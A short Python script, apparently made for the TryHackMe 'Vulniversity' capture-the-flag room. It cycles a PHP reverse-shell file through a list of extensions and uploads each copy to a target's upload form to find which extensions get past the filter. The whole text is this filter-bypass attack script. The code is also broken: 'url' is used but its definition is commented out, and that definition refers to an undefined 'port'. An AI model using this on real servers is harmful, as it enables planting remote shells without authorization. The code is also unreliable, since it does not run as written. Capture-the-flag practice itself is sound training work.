# file list comes from https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4
# based on john hammond's vulniversity thm ctf video script https://www.youtube.com/watch?v=hvYWCegfEZs&t=910s


#!/usr/bin/env python

import argparse
import requests 
import os 

parser = argparse.ArgumentParser()

parser.add_argument("-i", "--ip", dest="ip", help="Ip Address")
parser.add_argument("-s", "--sub-directory", dest="sub_directory", help="Sub-Directory. >> internal/index.php")

arguments = parser.parse_args()

ip = arguments.ip
sub_directory = arguments.sub_directory
# url = f"http://{ip}:{port}/{sub_directory}"

old_filename = "php-reverse-shell.php"

filename = "php-reverse-shell"

with open("file_extension_list.txt", "r") as f:
    lines = f.read().splitlines()

Array = list()

for line in lines: 
    Array.append(line)

for ext in Array:

    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)

    if not "Extension not allowed" in r.text:
        print(f"{ext} seems to be allowed")

    old_filename = new_filename






